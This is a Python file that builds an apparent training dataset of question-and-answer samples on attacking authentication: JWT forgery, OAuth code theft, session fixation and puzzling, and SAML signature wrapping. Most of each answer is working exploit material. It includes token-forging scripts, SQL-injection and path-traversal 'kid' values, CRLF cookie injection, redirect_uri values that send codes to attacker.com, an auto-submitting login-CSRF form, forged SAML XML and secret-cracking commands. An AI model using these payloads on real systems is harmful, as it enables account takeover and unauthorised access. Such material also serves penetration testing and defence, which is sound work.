#!/usr/bin/env python3
"""
Authentication and authorization attack dataset:
JWT attacks, OAuth flaws, session management, password attacks, SAML bypasses.
"""

from generate_dataset import Sample

AUTH_ATTACK_SAMPLES = [
    # ── JWT Attacks ──────────────────────────────────────────
    Sample(
        instruction="Describe all major JWT attack vectors: algorithm confusion, none algorithm, and key injection.",
        input="Target: Node.js API using jsonwebtoken library, RS256 tokens",
        output="""## JWT Security Vulnerabilities

JWT (JSON Web Tokens) are commonly misconfigured, enabling privilege escalation and auth bypass.

### 1. Algorithm None Attack

```python
# Original JWT header:
{"alg": "HS256", "typ": "JWT"}

# Forge with alg=none (no signature required):
import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin", "iat": 9999999999}).encode()
).rstrip(b'=').decode()

# Empty signature (just trailing dot)
forged_token = f"{header}.{payload}."
```

**Variations to try:**
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

### 2. Algorithm Confusion: RS256 → HS256

When a server uses RS256 (asymmetric), the public key is often discoverable.
If the library doesn't enforce algorithm type, switch to HS256 and sign with the public key as the secret.

```python
# Step 1: Get public key
curl https://target.com/.well-known/jwks.json
# Or: https://target.com/api/auth/keys

# Step 2: Convert JWKS to PEM
python3 -c "
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
import base64, struct, json

with open('jwks.json') as f:
    jwks = json.load(f)

key = jwks['keys'][0]
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')

from cryptography.hazmat.primitives import serialization
pub = RSAPublicNumbers(e, n).public_key()
pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
print(pem.decode())
" > public_key.pem

# Step 3: Forge HS256 token using the public key as HMAC secret
python3 -c "
import jwt
with open('public_key.pem', 'rb') as f:
    key = f.read()
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin'},
    key,
    algorithm='HS256'
)
print(token)
"
```

### 3. JWK Header Injection (CVE-pattern)

Some libraries trust the `jwk` parameter embedded in the JWT header itself:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_MODULUS",
    "e": "AQAB"
  }
}
```
→ Generate your own RSA key pair, embed the public key in header, sign with private key.

```bash
# Using jwt_tool
python3 jwt_tool.py TOKEN -X i
# (Self-signed with embedded JWK)
```

### 4. kid (Key ID) SQL/Path Injection

The `kid` parameter specifies which key to use for verification:
```json
{"alg": "HS256", "kid": "../../dev/null"}
```
If server does: `SELECT key FROM keys WHERE id = kid` → SQLi:
```json
{"kid": "' UNION SELECT 'attacker_secret'--"}
```
Then sign with `attacker_secret`.

Path traversal to predictable file:
```json
{"kid": "../../../../../../dev/null"}
```
Server reads `/dev/null` (empty string) as key → sign with empty string.

### 5. Expired/NBF Manipulation

If expiry is not validated server-side:
```python
# Simply decode, change exp to far future, re-encode
python3 jwt_tool.py TOKEN -T  # Tamper mode
```

### 6. JWT Brute Force (Weak HS256 Secret)

```bash
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
# or
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

### Tooling

```bash
# jwt_tool - comprehensive JWT testing
python3 jwt_tool.py "TOKEN" -t https://target.com/api/protected -rh "Authorization: Bearer TOKEN"
python3 jwt_tool.py "TOKEN" -X a   # alg=none
python3 jwt_tool.py "TOKEN" -X s   # HS256 with public key
python3 jwt_tool.py "TOKEN" -X k   # kid injection
python3 jwt_tool.py "TOKEN" -X j   # JWK injection

# jwt_hack (Go)
jwt_hack crack --token TOKEN --wordlist rockyou.txt
```

### Defense Checklist
- Enforce algorithm type server-side (never trust token's `alg` claim)
- Use asymmetric algorithms (RS256/ES256) with proper key management
- Validate `exp`, `nbf`, `iss`, `aud` claims
- Short expiry + refresh token rotation
- Implement token revocation list
""",
        category="auth",
        subcategory="jwt_attacks",
    ),
    # ── OAuth 2.0 Attacks ────────────────────────────────────
    Sample(
        instruction="What are the main OAuth 2.0 vulnerabilities and how do you exploit them for account takeover?",
        input="Target: OAuth 2.0 authorization code flow, SPA with GitHub OAuth integration",
        output="""## OAuth 2.0 Attack Techniques

### 1. Open Redirect in redirect_uri → Code Theft

If `redirect_uri` parameter validation is weak:
```
# Original:
https://target.com/oauth/authorize?
  client_id=CLIENT&
  redirect_uri=https://target.com/callback&
  response_type=code&state=xyz

# Attack — append subdirectory (if only origin is checked):
redirect_uri=https://target.com/callback/../../../redirect?url=https://attacker.com

# Attack — subdomain (if wildcard allowed):
redirect_uri=https://evil.target.com/callback

# Attack — path traversal:
redirect_uri=https://target.com/callback?/../../evil
```

**Result:** OAuth code is sent to attacker's URL via Referer or redirect.

### 2. State Parameter Bypass (CSRF)

```
# Vulnerable: state is missing or not validated
https://target.com/oauth/authorize?
  client_id=CLIENT&
  redirect_uri=https://target.com/callback&
  response_type=code
  # (no state parameter)

# Attack: CSRF to link attacker's account to victim
# Attacker generates: /oauth/authorize URL → gets code
# Trick victim into visiting: /callback?code=ATTACKER_CODE
# Result: victim's account is linked to attacker's OAuth identity
```

### 3. Authorization Code Interception

If the callback URL leaks to third parties via:
- Referrer header (page has links to external sites)
- Browser history
- Server logs accessible by attacker

```html
<!-- Victim visits /callback?code=AUTH_CODE&state=xyz -->
<!-- If callback page contains: -->
<img src="https://analytics.com/track.gif">
<!-- Referer header: https://target.com/callback?code=AUTH_CODE -->
```

### 4. Implicit Flow Token Leakage

```
# Implicit flow returns token in URL fragment:
https://target.com/callback#access_token=TOKEN&token_type=bearer

# Attack vectors:
# 1. Referrer leak (fragment survives navigation in some browsers)
# 2. postMessage theft (see XSS postMessage section)
# 3. Browser history
# 4. SPA router logging
```

### 5. Scope Upgrade Attack

```
# Original scope request:
scope=read:profile

# Upgrade attempt:
scope=read:profile write:admin delete:user

# Or: scope=openid profile email https://attacker.com/.well-known/scope
```

### 6. token_endpoint SSRF via request_uri

OAuth 2.1 supports `request_uri` — if the authorization server fetches the URI:
```
request_uri=http://169.254.169.254/latest/meta-data/
```

### 7. Mixing Up Attack (Multiple IdPs)

When app supports multiple OAuth providers without tying state to provider:
1. Attacker starts auth with their IdP (Provider B)
2. Captures auth code for Provider B
3. Injects it into victim's session as if it's Provider A's code

### 8. PKCE Bypass (Code Verifier Not Validated)

If PKCE is implemented but `code_verifier` not validated server-side:
```python
# Request token without valid code_verifier
requests.post('https://target.com/oauth/token', data={
    'grant_type': 'authorization_code',
    'code': intercepted_code,
    'redirect_uri': 'https://target.com/callback',
    'client_id': CLIENT_ID,
    # Omit code_verifier or send wrong one
})
```

### Automated Testing

```bash
# Burp Suite OAuth scanner (Pro)
# Detects: state issues, redirect_uri validation, scope upgrade

# Manual checklist:
# 1. Remove state parameter → does CSRF work?
# 2. Change redirect_uri → is it validated strictly?
# 3. Try redirect_uri=https://target.com.evil.com
# 4. Add extra scopes → are they granted?
# 5. Replay auth code → is it single-use?
# 6. Try /callback?code=ATTACKER_CODE after CSRF
```

### Account Takeover via Unlinked Account

```
# Step 1: Register account at target.com with victim's email/phone
# Step 2: Victim signs in via OAuth → app links OAuth identity to existing email
# Result: both attacker (password) and victim (OAuth) control same account
```
""",
        category="auth",
        subcategory="oauth_attacks",
    ),
    # ── Session Attacks ──────────────────────────────────────
    Sample(
        instruction="Describe advanced session attacks: session fixation, session puzzling, and cookie attribute exploitation.",
        input="",
        output="""## Advanced Session Management Attacks

### 1. Session Fixation

Attacker sets a known session ID before victim authenticates.

**Attack Flow:**
```
1. Attacker visits: https://target.com/login
   → Gets pre-auth session: SESSIONID=attacker_known_value

2. Trick victim into using same session:
   https://target.com/login?PHPSESSID=attacker_known_value
   (URL-based session IDs)

   OR: Set-Cookie injection via response splitting:
   https://target.com/redirect?url=http://target.com%0d%0aSet-Cookie:SESSIONID=evil

3. Victim logs in → session is now authenticated
4. Attacker uses SESSIONID=attacker_known_value → full access
```

**Vulnerable code pattern:**
```php
// PHP: session_start() before login without regenerating
session_start();
// ... validate credentials ...
$_SESSION['user'] = $username;
// Missing: session_regenerate_id(true);
```

### 2. Session Puzzling (Session Variable Overloading)

When different application features share session variables:
```python
# Login page sets: session['username'] = 'admin' (after verification)
# Password reset sets: session['username'] = request.form['email'] (without verification!)

# Attack:
# Step 1: Start password reset with session['username'] = 'admin'
POST /forgot-password
email=admin@target.com

# Step 2: Access protected resource that only checks session['username'] exists
GET /dashboard
# → Gains admin access because session['username'] = 'admin'
```

### 3. Cookie Attribute Attacks

**HttpOnly bypass via XSS trace:**
```
# TRACE method reflects cookies (HTTP TRACE)
curl -X TRACE https://target.com/ -H "Cookie: session=abc"
# If TRACE is enabled → response contains Cookie header → XSS can use TRACE to steal HttpOnly cookies
```

**Secure flag bypass via mixed content:**
```
# If parent page loads HTTP subresource:
http://target.com/track.gif
# Cookie WITHOUT Secure flag is sent with this HTTP request
# Even if login is HTTPS, if any subresource is HTTP → cookie can be sniffed
```

**SameSite bypass via cross-site top-level navigation:**
```
# SameSite=Lax allows cookies on GET navigations:
<a href="https://target.com/api/sensitive">click</a>
# Cookie is sent → GET-based CSRF is possible with SameSite=Lax

# Bypass SameSite=Strict via OAuth redirect:
# Attacker's page → redirect to IdP → redirect back to target
# (navigation chain resets SameSite context)
```

**Domain attribute misconfiguration:**
```
# Cookie with Domain=.target.com is sent to ALL subdomains
# If sub.target.com is vulnerable to XSS/takeover:
# Steal cookies from target.com via sub.target.com
Set-Cookie: session=abc; Domain=.target.com
```

### 4. JWT as Session Token — Revocation Bypass

```python
# If JWT-based session cannot be revoked:
# Attacker steals JWT → even after password change, JWT is valid until expiry
# Testing: change password, then use old JWT → if accepted → no revocation
```

### 5. Parallel Session Attack

```python
# Register multiple sessions, observe if old sessions are invalidated on new login
# Step 1: Login from Browser A → session_a
# Step 2: Login from Browser B → session_b
# Step 3: Use session_a → if still valid → no session invalidation on new login
# Impact: persistent access even after account activities
```

### 6. Session Donation / CSRF + Login CSRF

```
# If login form has no CSRF protection:
# Attacker can log victim into attacker's account
<form method="POST" action="https://target.com/login">
    <input name="username" value="attacker">
    <input name="password" value="attacker_pass">
</form>
<script>document.forms[0].submit()</script>

# Victim is now logged into attacker's account
# Any data victim enters is accessible to attacker
```

### Detection Checklist

```bash
# Test session regeneration
curl -c cookies.txt https://target.com/login  # Get pre-auth session ID
# Log in
curl -b cookies.txt -c cookies2.txt -X POST https://target.com/login \
    -d "user=test&pass=test"
# Compare session IDs before and after → should be different

# Test session fixation via URL parameter
curl "https://target.com/?PHPSESSID=fixation_test"
curl -b "PHPSESSID=fixation_test" https://target.com/login \
    -d "user=admin&pass=admin"
# If login succeeds with PHPSESSID=fixation_test → vulnerable
```
""",
        category="auth",
        subcategory="session_attacks",
    ),
    # ── SAML Attacks ────────────────────────────────────────
    Sample(
        instruction="How do you exploit SAML vulnerabilities including signature wrapping and XML comment injection?",
        input="Target: Enterprise SSO using SAML 2.0 with a Java service provider",
        output="""## SAML Vulnerability Exploitation

SAML (Security Assertion Markup Language) is a complex XML-based protocol
with several classes of vulnerabilities.

### 1. XML Signature Wrapping (XSW)

The SP validates a signature but processes a different XML element.
By restructuring the XML, attacker makes SP authenticate using unsigned data.

**Original valid SAML assertion:**
```xml
<samlp:Response>
  <saml:Assertion ID="_legit">
    <saml:Subject>
      <saml:NameID>legit_user@company.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <ds:Reference URI="#_legit">...</ds:Reference>
      <!-- Valid signature over _legit assertion -->
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

**XSW Attack (move original to extension, inject unsigned clone):**
```xml
<samlp:Response>
  <!-- INJECTED: unsigned assertion that SP processes -->
  <saml:Assertion ID="_evil">
    <saml:Subject>
      <saml:NameID>admin@company.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <!-- ORIGINAL: valid signature, but processed LAST -->
  <saml:Assertion ID="_legit">
    <saml:Subject>
      <saml:NameID>legit_user@company.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <ds:Reference URI="#_legit">...</ds:Reference>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

**8 XSW Variants (saml-raider covers all):**
```
XSW1: response level wrapping
XSW2: assertion level wrapping
XSW3: signed assertion in extension
XSW4: unsigned copy before signed
XSW5: assertion in signed subtree
XSW6: assertion with different position
XSW7: nested assertions
XSW8: assertion in KeyInfo
```

### 2. XML Comment Injection (CVE-2017-11427 pattern)

```xml
<!-- Vulnerable parser strips comments AFTER signature validation -->
<saml:NameID>
  admin<!---->.evil@company.com
</saml:NameID>
<!-- Parser sees: "admin.evil@company.com" during signature check -->
<!-- But application sees: "admin" after comment strip → logs in as admin! -->
```

**Variations:**
```xml
<saml:NameID>user@company.com<!---->.attacker.com</saml:NameID>
<saml:NameID>admin@<!---->company.com</saml:NameID>
```

### 3. Signature Exclusion

Some parsers skip signature validation if no `<ds:Signature>` element:
```xml
<!-- Simply remove the Signature element -->
<!-- Modify NameID to: admin@company.com -->
<!-- Re-encode and submit -->
```

### 4. SAML Response Replay

```bash
# Capture a valid SAML response (valid for limited time window)
# Re-submit: is it accepted twice?
# Test if InResponseTo is validated (replay of IdP-initiated flows)
```

### 5. XXE via SAML

(Covered in XXE section — SAML is XML, same techniques apply)

### Tools

```bash
# SAML Raider (Burp Extension)
# Intercept SAML response → SAML Raider tab → try all XSW variants

# saml2-xsw (standalone)
python3 saml2-xsw.py --input assertion.xml --attack xsw1 --email admin@target.com

# SAMLReQuest
python3 samlrequest.py --response base64_response --attack comment_injection

# Manual decode/modify/encode:
echo "BASE64_SAML" | base64 -d | python3 -c "
import sys, gzip
data = sys.stdin.buffer.read()
try:
    data = gzip.decompress(data)
except:
    pass
print(data.decode())
" | xmllint --format -
# Edit, then re-encode:
cat modified.xml | gzip | base64 -w0
```

### Automated Testing Workflow

```bash
# 1. Initiate SSO flow, capture SAML Response in Burp
# 2. Forward to SAML Raider → XSW Attacks tab
# 3. Try XSW1-8 with modified NameID=admin@target.com
# 4. Check each for successful authentication

# 5. Test comment injection manually:
python3 -c "
import base64, gzip
with open('original_response.xml') as f:
    xml = f.read()
# Modify NameID
xml = xml.replace(
    '<saml:NameID>user@company.com</saml:NameID>',
    '<saml:NameID>admin<!---->.user@company.com</saml:NameID>'
)
print(base64.b64encode(xml.encode()).decode())
"
```
""",
        category="auth",
        subcategory="saml_attacks",
    ),
]
